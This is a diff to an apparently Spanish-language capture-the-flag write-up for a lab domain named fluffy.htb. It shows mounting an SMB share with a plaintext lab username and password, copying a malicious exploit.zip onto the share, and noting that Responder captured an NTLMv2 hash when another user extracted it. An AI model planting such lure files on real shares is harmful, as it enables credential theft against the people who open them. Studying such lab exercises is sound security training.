@@ -148,7 +148,10 @@ El payload está dentro exploit.zip. ahora vamos a montar el recurso compartido 
   //dc01.fluffy.htb/IT /mnt/ \
   -o username='j.fleischman',password='J0elTHEM4n1990!',domain='fluffy.htb'
 
-sudo cp KeePass-2.58.zip /mnt/KeePass-2.58.zip
+❯ sudo cp exploit.zip /mnt/
 ```
 
 ![[Pasted image 20250528133557.png]]
+
+### Hashcat 
+La trampa activó el sistema. Responder capturó un hash NTLMv2 activo en cuanto FLUFFY\p.agilaextrajo el archivo ZIP:
